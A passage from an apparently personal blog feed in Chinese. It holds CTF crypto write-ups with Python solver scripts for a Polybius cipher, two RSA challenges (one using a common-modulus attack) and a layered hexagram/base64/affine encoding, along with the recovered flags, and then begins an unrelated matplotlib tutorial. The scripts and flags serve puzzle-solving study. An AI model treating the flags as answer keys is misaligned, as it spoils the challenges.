class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> each <span class="token keyword">in</span> key<span class="token punctuation">:</span>    temp_cipher <span class="token operator">=</span> <span class="token string">""</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> temp <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        temp_cipher <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>each<span class="token punctuation">.</span>index<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">#这里其实是将字母的表换成数字的表以便后续计算</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        current_ascii <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">97</span>     <span class="token comment">#因为棋盘密码是采用两位一起表示一个字母</span>        <span class="token keyword">if</span> current_ascii<span class="token operator">></span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            current_ascii<span class="token operator">+=</span><span class="token number">1</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>current_ascii<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag        **BJD{flagispolybius} **</p><p>4 easyrsa</p><p>很简单的一个rsa，就是再求取欧拉函数是对于(p-1)(q-1)的获取要先进行一步转换，题中给出了p和q的关系式，及一个求导的过程，化简后可以得出<code>z=p^2+q^2</code>,最后再根据<code>n=p * q</code>,即可得出<code>（p-1）*（q-1） </code>下面是exp：</p> <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn<span class="token operator">=</span><span class="token number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span>z<span class="token operator">=</span><span class="token number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span>c<span class="token operator">=</span><span class="token number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span>e<span class="token operator">=</span><span class="token number">65537</span>p_and_q_square <span class="token operator">=</span> z <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">*</span>n <span class="token comment">#这个要通过化简一下z就可以发现其中的关系，其实就是简单的导数化简</span>p_and_q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>p_and_q_square<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#(mpz(250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442), True)</span>final_p_and_q <span class="token operator">=</span> <span class="token number">250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442</span>Euler_function <span class="token operator">=</span> n <span class="token operator">-</span> final_p_and_q <span class="token operator">+</span> <span class="token number">1</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>Euler_function<span class="token punctuation">)</span><span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-rsa-output"><a href="#5-rsa-output" class="headerlink" title="5 rsa_output"></a>5 rsa_output</h4><p>题目描述直接给出，模的相关攻击，再看一下给出的附件，发现两次的N是相同的，所以可以确定是共模攻击</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>e1 <span class="token operator">=</span> <span class="token number">2767</span>e2 <span class="token operator">=</span> <span class="token number">3659</span>message1 <span class="token operator">=</span> <span class="token number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span>message2 <span class="token operator">=</span> <span class="token number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><span class="token comment"># s &amp; t</span>gcd<span class="token punctuation">,</span> s<span class="token punctuation">,</span> t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token keyword">if</span> s <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token operator">-</span>s    message1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>message1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">if</span> t <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> <span class="token operator">-</span>t    message2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>message2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>plain <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>message1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>message2<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-伏羲六十四卦"><a href="#8-伏羲六十四卦" class="headerlink" title="8 伏羲六十四卦"></a>8 伏羲六十四卦</h4><p>套娃题目，这个是哪个人才像出来的？</p><p>伏羲六十四卦： 题目中给出了几段描述，大致可以猜测一下可能会有多层加密 首先一开始提到六十四卦，百度一下，可以看到其实是利用六位二进制对文字进行替换，根据其二进制矩阵先构造码表，然后根据码表将密文转成二进制： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>mydisc<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>keys<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> mingwen    mingwen<span class="token operator">=</span>enc    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        mingwen<span class="token operator">=</span>mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span>mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二层：下一步就是将二进制转换成ASCII：  </p><p>第三层：发现是base64，再解密：发现是一段奇怪的密文，此时附件中的py文件中有提示是加密的源码，分析发现是第四和第五层的加密方式，第四层这里我们可以发现，这里是采用一个偏移量为5并且依次后移一位的加密，这里只要将减换成加即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'n]h\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP'</span>temp<span class="token operator">=</span><span class="token string">''</span>offset<span class="token operator">=</span><span class="token number">5</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 得到解密后结果： Scodfuvmhityhirfuxfuvziiruvigzkyhv 而后再是第五层：这里采用了仿射密码，根据加密方式写一下解密脚本即可 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">string <span class="token operator">=</span> <span class="token string">'scodfuvmhityhirfuxfuvziiruvigzkyhv'</span>b<span class="token operator">=</span><span class="token number">7</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> string<span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 最终得到flag： 加上格式即可：<code>BJD&#123;bjdcongratulationsongettingtheflag&#125; </code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python绘图与数据可视化(二)</title>
      <link href="/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/"/>
      <url>/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>上一次是于老师要求我做一次备课，讲一节课，上周于老师又自己准备了这个课程，这里放一下于老师课上补充的知识点</p><blockquote><p> Matplotlib 提供了一个套面向绘图对象编程的 API 接口，能够很轻松地实现各种图像的绘制，并且它可以配合 Python GUI 工具（如 PyQt、Tkinter 等）在应用程序中嵌入图形。同时 Matplotlib 也支持以脚本的形式嵌入到 IPython shell、Jupyter 笔记本、web 应用服务器中使用。</p></blockquote><h3 id="Matplotlib图形组成"><a href="#Matplotlib图形组成" class="headerlink" title="Matplotlib图形组成"></a>Matplotlib图形组成</h3><p><strong>Matplotlib</strong>生成的图形主要由以下几个部分构成：</p><pre class="line-numbers language-none"><code class="language-none">Figure：指整个图形，可以把它理解成一张画布，它包括了所有的元素，比如标题、轴线等；Axes：绘制 2D 图像的实际区域，也称为轴域区，或者绘图区；Axis：指坐标系中的垂直轴与水平轴，包含轴的长度大小（图中轴长为 7）、轴标签（指 x 轴，y轴）和刻度标签；Artist：您在画布上看到的所有元素都属于 Artist 对象，比如文本对象（title、xlabel、ylabel）、Line2D 对象（用于绘制2D图像）等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Matplotlib功能扩展包"><a href="#Matplotlib功能扩展包" class="headerlink" title="Matplotlib功能扩展包"></a>Matplotlib功能扩展包</h3><p>许多第三方工具包都对 Matplotlib 进行了功能扩展，其中有些安装包需要单独安装，也有一些允许与 Matplotlib 一起安装。常见的工具包如下：</p><p>Bashmap：这是一个地图绘制工具包，其中包含多个地图投影，海岸线和国界线；<br>Cartopy：这是一个映射库，包含面向对象的映射投影定义，以及任意点、线、面的图像转换能力；<br>Excel tools： 这是 Matplotlib 为了实现与 Microsoft Excel 交换数据而提供的工具；<br>Mplot3d：它用于 3D 绘图；<br>Natgrid：这是 Natgrid 库的接口，用于对间隔数据进行不规则的网格化处理。</p><h3 id="Matplotlib-pyplot接口汇总"><a href="#Matplotlib-pyplot接口汇总" class="headerlink" title="Matplotlib.pyplot接口汇总"></a>Matplotlib.pyplot接口汇总</h3><p>Matplotlib 中的 pyplot 模块是一个类似命令风格的函数集合，这使得 Matplotlib 的工作模式和 MATLAB 相似。pyplot 模块提供了可以用来绘图的各种函数，比如创建一个画布，在画布中创建一个绘图区域，或是在绘图区域添加一些线、标签等。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/1.png" alt="Matplotlib.pyplot接口汇总"></p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/2.png" alt="Figure函数"></p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/3.png" alt="Axes"></p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/23/python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/4.png" alt="image"></p><h2 id="Matplotlib-figure图形对象"><a href="#Matplotlib-figure图形对象" class="headerlink" title="Matplotlib figure图形对象"></a>Matplotlib figure图形对象</h2><p>通过前面的学习，我们知道matplotlib.pyplot模块能够快速地生成图像，但如果使用面向对象的编程思想，我们就可以更好地控制和自定义图像。<br>在 Matplotlib 中，面向对象编程的核心思想是创建图形对象（figure object）。通过图形对象来调用其它的方法和属性，这样有助于我们更好地处理多个画布。在这个过程中，pyplot 负责生成图形对象，并通过该对象来添加一个或多个 axes 对象（即绘图区域）。<br>Matplotlib 